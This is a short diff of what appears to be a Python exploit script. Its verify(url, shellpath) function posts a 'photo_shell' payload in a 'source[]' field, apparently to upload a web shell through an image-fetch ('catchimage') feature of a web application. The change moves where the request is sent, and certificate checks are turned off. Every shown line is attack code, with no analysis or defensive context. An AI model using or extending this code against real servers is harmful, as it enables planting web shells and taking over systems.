@@ -15,7 +15,7 @@ def verify(url, shellpath):
         'Content-Type': 'application/x-www-form-urlencoded',
         'Upgrade-Insecure-Requests': '1'
         }
-    req = requests.post(url=url+'?action=catchimage',headers=headers,data='source[]='+photo_shell,verify=False, timeout=20)
+    req = requests.post(url=url,headers=headers,data='source[]='+photo_shell,verify=False, timeout=20)
     try:
         info = req.json()
     except:
